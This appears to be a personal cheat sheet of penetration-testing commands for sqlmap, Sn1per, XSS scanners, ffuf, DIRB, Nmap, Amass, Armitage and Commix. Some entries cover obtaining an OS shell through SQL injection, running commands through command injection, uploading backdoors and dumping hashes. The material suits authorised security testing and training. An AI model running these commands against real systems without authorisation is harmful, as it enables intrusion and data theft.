
1. sqlmap 

sqlmap -r any.txt --dbs

// in any.txt save the request you need to inject [  Capture the Request in burpsite and save it in a .txt file  ]

// The command sqlmap -r any.txt --dbs is used with sqlmap, a popular open-source penetration testing tool for detecting and exploiting SQL injection vulnerabilities in web applications.
// Here's a breakdown of the command:
// -r any.txt: This option tells sqlmap to read the HTTP request from a file named any.txt. This file should contain the full HTTP request, including headers and any payload data.
// --dbs: This option instructs sqlmap to enumerate the databases present in the target application.

sqlmap -r any.txt --os-shell

// in any.txt save the request you need to inject [  Capture the Request in burpsite and save it in a .txt file  ]

// In the command sqlmap -r test.txt --os-shell, the options --os-shell are used as follows:
// --os-shell: This option is a command within sqlmap that attempts to provide you with an interactive operating system shell on the target server after exploiting a SQL injection vulnerability.

// Explanation of Terms
// --os: This part of the command refers to the option that allows sqlmap to interact with the underlying operating system of the target server.
// shell: This specifies that you want to obtain a shell interface, allowing you to execute commands directly on the server's operating system.

Usage Context

// When you run this command, sqlmap will:
// Attempt to exploit the SQL injection based on the request in test.txt.
// If successful, it will give you a shell interface where you can run commands as if you were logged into the server.

sqlmap -r ~/Documents/Code/Pentest/sqlmap-master/request.txt --dbs --batch --no-cast --flush-session

--dbs            Enumerate DBMS databases
--batch          Never ask for user input, use the default behavior
--no-cast        Turn off payload casting mechanism
--flush-session  Flush session files for current target

sqlmap -u 'http://localhost:3000/rest/user/login' --data="email=test@test.com&password=test" --level 5 --risk 3 -f --banner --ignore-code 401 --dbms='sqlite' --technique=B


sqlmap-u "http://the url u want to inject with the id " --batch
example: sqlmap-u "http://192.168.0.0/room.php?cod=1" –batch

sqlmap --wizard [This command will open a sqlmap console]

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

2. Sn1per Command Overview

Basic Command Structure
sniper -t <target> [options]
Example : sniper -t example.com

Common Commands

Scan a Target
// Description: Performs a basic scan on the specified target.
// sniper -t <target-ip-or-domain>

Full Scan
// Description: Conducts a comprehensive scan using multiple modules.
// sniper -t <target-ip-or-domain> -f

Save Output
// Description: Saves the scan results to a specified directory.
// sniper -t <target-ip-or-domain> -o <output-directory>

Web Application Scan
// Description: Specifically targets web applications for vulnerabilities.
// sniper -t <target-ip-or-domain> --web

Service Version Detection
// Description: Identifies services and their versions running on the target.
// sniper -t <target-ip-or-domain> --services

Nmap Integration
// Description: Runs an Nmap scan as part of the Sn1per process.
// sniper -t <target-ip-or-domain> -n

Custom Configuration File
// Description: Uses a specified configuration file to customize scans.
// sniper -t <target-ip-or-domain> -c <config-file>

Scan for Specific Vulnerabilities
// Description: Focuses on certain known vulnerabilities.
// sniper -t <target-ip-or-domain> --scan-vulns

Update Sn1per
// Description: Updates the Sn1per tool to the latest version.
// sniper --update

View Help and Options
// Description: Displays all available commands and options.
// sniper --help

Example Usage

Performing a Full Scan on a Target:
// sniper -t example.com -f

Scanning a Specific IP Address with Output:
// sniper -t 192.168.1.10 -o /path/to/output

Running a Web Application Security Scan:
// sniper -t example.com --web

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
3.XSSFUZZ

Usage

Basic Scan
// python xssFuzz.py -u "<target_url>" -o output.txt
// This command runs a basic scan on the target URL and saves the results in output.txt.

Verbose Output
// python xssFuzz.py -u "<target_url>" -o output.txt --verbose
// Provides more detailed information about the scan.

Tag-Specific Testing
// python xssFuzz.py -u "<target_url>" --tag img -o output.txt
// Scan only specific HTML tags, such as <img>.

Custom Payloads
// python xssFuzz.py -u "<target_url>" -p "<payload_file>" -o output.txt
// Use custom payloads to scan specific attack vectors.

Custom Headers
// python xssFuzz.py -u "<target_url>" -H "Header1:Value,Header2:Value" -o output.txt
// Include custom headers in your scan.

Limiting Scope
// python xssFuzz.py -u "<target_url>" --limit 5 -o output.txt
// Limit the scan to the first 5 tags and 5 events for faster results.

Increasing Speed with Threads
// python xssFuzz.py -u "<target_url>" -t 10 -o output.txt
// Increase scan speed by running 10 concurrent threads.

Validation Mode
// python xssFuzz.py -u "<target_url>" -V -o output.txt

 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
4. fuff

Fuff is a powerful web application security tool designed for fuzzing endpoints.It helps identify vulnerabilities by sending numerous requests based on a wordlist. 

Purpose
// Fuzzing: Fuff is primarily used to discover hidden endpoints and files by replacing a specific part of the URL with entries from a wordlist.
// Security Testing: It assists security professionals in testing web applications for potential vulnerabilities.

Features
// High Performance: Fuff is optimized for speed and can handle multiple requests concurrently, making it efficient for large-scale fuzzing.
// Flexible Output: Users can filter responses based on status codes, content lengths, and more, providing targeted results.
// Custom Wordlists: Users can utilize custom wordlists to tailor the fuzzing process to specific applications or environments.

Usage
// Navigate to the Directory
// Use the cd command to navigate to the folder where fuff is installed. For example:cd /path/to/fuff
// Run the Command
// Use the command to start fuzzing a target URL:fuff -u <URL> -w <wordlist>
// Replace <URL> with your target and <wordlist> with the path to your wordlist file.

Customize Options
// Specify parameters like the number of threads or minimum response codes to filter. For example:fuff -u http://example.com/FUZZ -w /path/to/wordlist.txt -mc 200

Output to File
// To save the output to a file, you can redirect it:fuff -u http://example.com/FUZZ -w /path/to/wordlist.txt > output.txt
// fuff -u http://example.com/FUZZ -w /path/to/wordlist.txt -mc 200 > output.txt
// This command will fuzz the specified URL with the provided wordlist and save responses with a 200 status code to output.txt.

Applications
// Web Application Testing: Security testers use it to identify hidden endpoints, files, and potential vulnerabilities in web applications.
// Penetration Testing: Ethical hackers utilize Fuff as part of their toolset to explore and exploit security weaknesses.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
5. DIRB

DIRB is a web content scanner that helps discover resources on web servers. It uses a wordlist to brute-force directories and files. Here’s a concise overview:

Purpose
// Directory and File Enumeration: DIRB scans a specified URL to find hidden directories and files by attempting to access them based on a given wordlist.
// Security Testing: Useful in penetration testing to identify potential vulnerabilities in web applications.

Features
// Custom Wordlists: Users can specify their own wordlists to tailor the scan to specific applications or environments.
// Response Filtering: It can filter results based on HTTP response codes, allowing users to focus on potentially interesting files or directories.
// Recursive Scanning: DIRB can perform recursive scans to discover deeper directory structures.

Usage

Basic Command
// To scan a target URL with the default wordlist:dirb http://example.com

Using a Custom Wordlist
// To specify a custom wordlist:dirb http://example.com /path/to/wordlist.txt

Filtering by Response Code
// To filter results by specific HTTP status codes:dirb http://example.com -r

Output to File
// To save the output to a file:dirb http://example.com -o output.txt

Example Command
// dirb http://example.com /path/to/wordlist.txt -o output.txt
// This command will scan the specified URL with the custom wordlist and save the results to output.txt.

Applications
// Web Application Testing: Security professionals use it to uncover hidden endpoints and sensitive files.
// Penetration Testing: A valuable tool for ethical hackers looking to assess the security of web applications.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
6. Nmap

Nmap (Network Mapper) is a powerful open-source tool used for network discovery and security auditing.
It’s widely utilized by network administrators and security professionals to identify devices on a network, discover services, and assess security vulnerabilities.

Purpose

// Network Discovery: Nmap can discover hosts and services on a computer network, providing insights into the devices connected and their operating systems.
// Security Auditing: It helps in identifying vulnerabilities in networked systems, allowing security professionals to harden their defenses.

Features

// Port Scanning: Nmap can perform various types of port scans to determine which ports are open, closed, or filtered on a target system.
// Service and Version Detection: It can identify running services on open ports and their versions, which is crucial for vulnerability assessment.
// OS Detection: Nmap can determine the operating system of a target host through various techniques.
// Scripting Engine: Nmap includes a scripting engine (NSE) that allows users to write scripts to automate a wide range of networking tasks.

Usage

Basic Scan
// To scan a target IP or domain for open ports:nmap <target_ip_or_domain>
// Example:nmap 192.168.1.1

Service Version Detection
// To detect services and versions running on the open ports:nmap -sV <target_ip_or_domain>

Operating System Detection
// To determine the operating system of the target:nmap -O <target_ip_or_domain>

Aggressive Scan
// To combine service detection, OS detection, and other features for a detailed analysis:nmap -A <target_ip_or_domain>

Scan Multiple IPs
// To scan a range of IPs:nmap 192.168.1.1-254

Output to File
// To save the results in a file:nmap -oN output.txt <target_ip_or_domain>
// Example Command:nmap -sV -O 192.168.1.1
// This command performs a service version detection and OS detection scan on the target IP 192.168.1.1.

Applications

// Network Security Auditing: Security professionals use Nmap to assess the security posture of networks by identifying vulnerabilities.
// Network Inventory: System administrators utilize it to map out network devices and services for inventory and management purposes.
// Penetration Testing: Ethical hackers rely on Nmap to gather information about targets before conducting further testing.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
7. Dalfox

Dalfox is a fast and powerful tool designed for detecting and exploiting XSS (Cross-Site Scripting) vulnerabilities in web applications. It is highly useful for security professionals and penetration testers.

Purpose

// XSS Vulnerability Detection: Dalfox scans web applications to identify potential XSS vulnerabilities by injecting various payloads into parameters and analyzing the responses.
// Payload Automation: Automates the process of testing multiple endpoints with different payloads to find XSS issues quickly.

Features

// Fast Scanning: Designed for high-speed scanning, allowing users to quickly test large numbers of endpoints.
// Custom Payloads: Supports custom payloads for more targeted testing.
// Contextual Scanning: Can detect different types of XSS (e.g., reflected, stored) based on the application context.
// Report Generation: Generates reports to summarize the findings for further analysis.

Installation

// Dalfox Installation on Kali Linux
// To install Dalfox on Kali Linux, you can follow these methods:

1. Using Go (Recommended)
// Install Go (if not already installed):
// sudo apt update
// sudo apt install golang
// Install Dalfox:
// go install github.com/hahwul/dalfox/v2@latest
// Add Go binaries to your PATH (if not already added):
// echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
// source ~/.bashrc

2. Downloading Precompiled Binaries
// Download the latest binary:
// wget https://github.com/hahwul/dalfox/releases/latest/download/dalfox-linux-amd64
// Make the binary executable:
// chmod +x dalfox-linux-amd64
// Move it to a directory in your PATH:
// sudo mv dalfox-linux-amd64 /usr/local/bin/dalfox

3. Using Docker
// If you prefer using Docker, you can run Dalfox in a container with the following command:
// docker run -it --rm --name dalfox hahwul/dalfox
// Verifying Installation
// After installation, you can verify that Dalfox is installed correctly by checking its version:
// dalfox -v

Usage

Basic Scan
// To perform a basic scan on a target URL:dalfox url <URL>

Using a Custom Payload File
// To specify a custom payload file:dalfox url <URL> --payload /path/to/payloads.txt

JSON Output
// To output results in JSON format:dalfox url <URL> --json

Multiple URLs
// To scan multiple URLs from a file:dalfox file <urls.txt>

Verbose Mode
// To enable verbose output for more detailed information during the scan:dalfox url <URL> -v

Example Command
// dalfox url http://example.com/search?q=<script>alert(1)</script> --json
// This command will test the specified search parameter for XSS vulnerabilities using the default payloads and output the results in JSON format.

Applications

// Web Application Security Testing: Used by security professionals to find and exploit XSS vulnerabilities in web applications.
// Penetration Testing: An essential tool for ethical hackers during the assessment phase of web applications.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
8. XSS Strike

XSS Strike is an advanced tool designed for finding and exploiting Cross-Site Scripting (XSS) vulnerabilities in web applications.
It automates the process of testing various payloads and helps security professionals assess the security of web applications.

Purpose

// XSS Vulnerability Detection: XSS Strike is specifically built to discover XSS vulnerabilities by injecting payloads into web application parameters and analyzing responses.
// Payload Automation: It streamlines the testing process by automatically injecting a wide range of XSS payloads.

Features

// Advanced Payloads: Comes with a comprehensive set of XSS payloads to test various scenarios.
// Recursive Scanning: Supports recursive scanning to discover XSS vulnerabilities in deeply nested parameters.
// User-Friendly Interface: Provides a simple command-line interface to perform scans efficiently.
// Output Reports: Generates reports summarizing findings, which can be useful for further analysis.

Installation

// Clone the Repository
// You can clone the XSS Strike GitHub repository: git clone https://github.com/s0md3v/XSStrike.git
// cd XSStrike
// Install Dependencies
// Make sure you have Python 3 installed. Install the required dependencies:
// pip install -r requirements.txt
// Run XSS Strike
// You can run XSS Strike using Python: python xsstrike.py

Usage

Basic Scan
// To perform a scan on a target URL:
// python xsstrike.py -u http://example.com/page?param=value

Using Custom Payloads
// To use custom payloads, you can specify a payload file:
// python xsstrike.py -u http://example.com/page?param=value -p /path/to/payloads.txt

Verbose Mode
// To enable verbose output:
// python xsstrike.py -u http://example.com/page?param=value -v

Output to File
// To save results to a file:
// python xsstrike.py -u http://example.com/page?param=value -o output.txt

Example Command
// python xsstrike.py -u http://example.com/search?q=<script>alert(1)</script> -v
// This command tests the specified query parameter for XSS vulnerabilities using a basic payload and enables verbose output.

Applications

// Web Application Security Testing: Used by security testers to find and exploit XSS vulnerabilities in applications.
// Penetration Testing: An essential tool for ethical hackers during the assessment phase of web applications.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

9. Katana is a powerful tool designed for reconnaissance and information gathering. Here are some common usage patterns and commands:

Installation:

option - 1
// CGO_ENABLED=1 go install github.com/projectdiscovery/katana/cmd/katana@latest
option - 2 
// docker pull projectdiscovery/katana:latest
// To run katana in standard mode using docker - docker run projectdiscovery/katana:latest -u https://tesla.com
// To run katana in headless mode using docker - docker run projectdiscovery/katana:latest -u https://tesla.com -system-chrome -headless


Basic Command Structure

// katana [flags] <target>
// Common Flags
// -h, --help: Display help information.
// -o, --output: Specify the output file for results.
// -p, --proxy: Set a proxy for requests.
// -t, --timeout: Set a custom timeout for requests.
// -d, --delay: Introduce a delay between requests to avoid rate limiting.

Basic Usage:
// katana -d example.com

Output to a File:
// katana -o results.txt -d example.com

Using a Proxy:
// katana -p http://localhost:8080 -d example.com

Setting a Timeout:
// katana -t 5s -d example.com

Specifying a Delay:
// katana -d example.com -D 1s

Modules
// Katana may include various modules for specific tasks, such as subdomain enumeration, vulnerability scanning, etc. You can typically list these modules with:
// katana --list-modules

Help Command
// For detailed information on specific commands and options, you can always run:katana --help

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
10. xss_vibes

https://github.com/faiyazahmad07/xss_vibes

// Clone the repository: git clone https://github.com/faiyazahmad07/xss_vibes
// Install the requirements file: pip3 install -r requirements
// Run the main.py file

USAGE
// python3 main.py -f <filename> -o <output>
// -f: Filename that contains bunch of links
// -o: Output filename in which all the vulnerable endpoints is stored
// -t: No of threads[Increase the threads if you want more speed] (Max: 10)
// -u: Single URL to scan.
// -H: Custom Headers.(PLease use , within "" to add multiple headers)
// --crawl: Crawl the links first and then find xss

Using  multiple  headers:
// python3 main.py -f urls.txt -H "Cookies:test=123;id=asdasd, User-Agent: Mozilla/Firefox" -t 7 -o result.txt

Using  single  header:
// python3 main.py -f urls.txt -H "Cookies:test=123;id=asdasd" -t 7 -o result.txt

Scanning single URL:
// python3 main.py -u http://example.com/hpp/?pp=12 -o out.txt

Detect waf & scan:
// python3 main.py -u http://example.com/hpp/?pp=12 -o out.txt --waf

Specify waf manually:
// python3 main.py -u http://example.com/hpp/?pp=12 -o out.txt -w cloudflare

Using PIPE
// cat katana.txt | python3 main.py --pipe -t 7
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
11.Amass

Installation

// First, ensure you have Go installed on your system, then you can install Amass using:
// go install -v github.com/OWASP/Amass/v3/...@latest
// Or you can download precompiled binaries from the Amass releases page.

Important Note:

// APIs: Register for services like VirusTotal, Shodan, and others to use their APIs for better data.
// Verbose Mode: Use the -v flag for verbose output to troubleshoot or see more details during execution.

Basic Usage
Enumerating Subdomains: To find subdomains for a given domain, use:
// amass enum -d example.com

Output to a File: To save the results to a text file:
// amass enum -d example.com -o subdomains.txt

Using Multiple Data Sources: Amass can use different techniques for enumeration. You can specify sources with the -src option:
// amass enum -d example.com -src

Active and Passive Enumeration: You can specify the type of enumeration. For passive enumeration, use:
// amass enum -passive -d example.com

For active enumeration, simply run:
// amass enum -active -d example.com

DNS Resolution: If you want to resolve the discovered subdomains to IP addresses:
// amass resolve -d example.com -o resolved_ips.txt

Advanced Options

Using Config Files: Amass can be configured using a configuration file for API keys and settings:
// amass config -save

Using Specific APIs: You can specify which APIs to use by modifying the configuration file or using command-line flags:
// amass enum -d example.com -api <api_name>

Visualizing Results: You can create a visual graph of the discovered subdomains:
// amass viz -d example.com -o graph.svg

Performing DNS Brute Force: To perform brute-force enumeration of subdomains:
// amass enum -brute -d example.com

Network Mapping: To visualize the entire network with connections:
// amass track -d example.com -o track_output.txt

Example Workflows

 Basic Subdomain Enumeration and Resolution:
// amass enum -d example.com -o subdomains.txt
// amass resolve -o resolved_ips.txt -d example.com

Full Enumeration with Visualization:
// amass enum -d example.com -o subdomains.txt -src
// amass viz -d example.com -o graph.svg

// amass intel -d <domain> [options]

Common Options

Specify the Domain:
// Use the -d flag to specify the target domain.
// amass intel -d example.com

Output Options:
// To save the results to a file, use the -o option:
// amass intel -d example.com -o output.txt

Sources:
// Use the -src option to include the sources from which data was gathered.
// amass intel -d example.com -src

Brute Forcing:
// If you want to perform brute-force subdomain enumeration in addition to intelligence gathering, include the -brute option:
// amass intel -d example.com -brute

Passive Enumeration:

To focus solely on passive reconnaissance:
// amass intel -d example.com -passive

API Usage:

Amass can utilize various APIs for enhanced results. Ensure you've configured your API keys and use the -api option if necessary:
// amass intel -d example.com -api <api_name>

Verbose Output:

For more detailed output, use the -v flag:
// amass intel -d example.com -v

Example Workflows

Basic Intelligence Gathering:
// amass intel -d example.com -o intel_results.txt

Passive Intelligence Gathering with Source Information:
amass intel -d example.com -passive -src -o passive_results.txt

Combining Brute Force with Intelligence Gathering:
// amass intel -d example.com -brute -o all_results.txt

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

12.Ferox Buster

// feroxbuster -u https://site.com 
// feroxbuster -u https://site.com -w /usr/share/wordlists/dirb/big.txt


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
13. sqlmapapi
sqlmapapi -s
sqlmapapi -c -H 127.0.0.1 -p 8775

for scan :
in the api command : new -u 'https://example.com'

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
14.Armitage
Armitage is a graphical user interface (GUI) for the Metasploit Framework, a powerful penetration testing tool used for discovering, exploiting, and validating vulnerabilities in systems. 

Scanning a Network:

Use Nmap or Armitage’s internal scanner to identify live hosts on a network.
Example: Scan the subnet 192.168.1.0/24.
Identifying Vulnerabilities:

Select the discovered hosts and search for available exploits.
Example: Right-click on the target host and select "Find Attacks."
Exploiting a Vulnerability:

Once an exploit is found, you can use it to compromise the system.
Example: Use an MS08-067 exploit to compromise a Windows system.
Post-Exploitation:

After successful exploitation, gather information, dump hashes, and escalate privileges.
Example: Use meterpreter to take control and pivot through the network.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
15. Commix

Commix (Command Injection Exploiter) is a tool used to automatically detect and exploit command injection vulnerabilities in web applications.
Command injection vulnerabilities occur when an attacker can inject arbitrary commands into a system shell through a web application, often leading to unauthorized access, system compromise, or data leakage.

commix --wizard [ use it like sqlmap ]

1. Installing Commix
You can install Commix directly from its GitHub repository. To get started:

Clone the repository:
git clone https://github.com/commixproject/commix.git
cd commix

Install required dependencies:
Commix requires Python and a set of dependencies. You can install them by running:
pip install -r requirements.txt

2. Basic Usage
Syntax:
The basic syntax of the tool is:
python commix.py --url <target_url> --data "<POST_data>" --cookie "<cookie_data>"

commix -u https://example.com

Where:

--url <target_url>: The URL of the web application you want to test.
--data <POST_data>: The data to be sent using the POST method (e.g., form parameters).
--cookie <cookie_data>: (Optional) If authentication is required, pass session cookies.

3. Testing for Command Injection

Example 1: GET-based Command Injection
If the vulnerability is in a GET parameter, you can test it like this:
python commix.py --url "http://example.com/page.php?id=1"
This checks if the id parameter is vulnerable to command injection.

Example 2: POST-based Command Injection
For POST data (e.g., form submission), use:
python commix.py --url "http://example.com/login.php" --data "username=admin&password=admin"
This submits the specified data and tests for command injection in the POST parameters.

Example 3: Using Cookies for Authenticated Sessions
If the application uses cookies for authentication, provide them like this:
python commix.py --url "http://example.com/page.php?id=1" --cookie "PHPSESSID=your_session_id"

4. Advanced Options

Specifying Injection Technique
Commix can use various injection techniques to bypass security mechanisms:
python commix.py --url "http://example.com/page.php?id=1" --technique=1
--technique=1 (or -t 1): Uses a specific technique to test for command injection.
Setting Risk and Level

You can control how thoroughly Commix tests for vulnerabilities:
--level <level>: Specifies how thoroughly to test the parameters (levels range from 1 to 5).
--risk <risk>: Defines the risk level for the payloads (1 to 3).
Example:
python commix.py --url "http://example.com/page.php?id=1" --level 3 --risk 2

Interactive Mode
Commix also offers an interactive mode, where you can manually interact with the target and refine your tests based on live responses:
python commix.py --url "http://example.com/page.php?id=1" --interactive

5. Post-Exploitation
After successful exploitation, you may be able to:
Execute system commands: Run arbitrary commands on the target machine.
Download files: Retrieve sensitive files from the target.
Upload files: Upload files to the target server (such as backdoors or exploits).

Example of running a simple command (whoami) on the target server after exploitation:
python commix.py --url "http://example.com/page.php?id=1" --os-cmd "whoami"

6. Help and Documentation
For more details on the options and syntax, you can always refer to the help command:
python commix.py --help
This will display all available options and their descriptions.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
16.wget

Wget is a powerful and flexible command-line utility available in Kali Linux and many other Linux distributions. It is primarily used for downloading files and content from the web, but it can also be used for web crawling and mirroring websites.

Download a Complete Website: You can mirror an entire website by using the -r flag along with -np and -k options.
wget -r -np -k http://example.com

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

paramspider Mining URLs from dark corners of Web Archives for bug hunting/fuzzing/further probing

